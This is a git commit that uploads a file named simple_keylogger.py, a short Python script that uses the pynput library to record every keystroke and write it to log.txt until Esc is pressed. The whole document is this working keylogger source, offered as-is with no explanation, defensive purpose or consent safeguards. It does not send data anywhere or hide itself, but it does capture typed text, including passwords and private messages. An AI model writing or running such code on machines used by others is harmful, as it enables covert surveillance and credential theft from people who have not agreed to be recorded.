3d667a6f14810e416b5a1d77f23630dc1bc1bbe5
Utkarsh <165904031+utk-ydv@users.noreply.github.com>
2024-07-13 11:14:46 +0530

    Add files via upload

---
+++ simple_keylogger.py
@@ -0,0 +1,23 @@
+from pynput.keyboard import Key, Listener
+
+keys = []
+
+def on_press(key):
+    keys.append(key)
+    write_file(keys)
+
+def write_file(keys):
+    with open("log.txt", "w") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
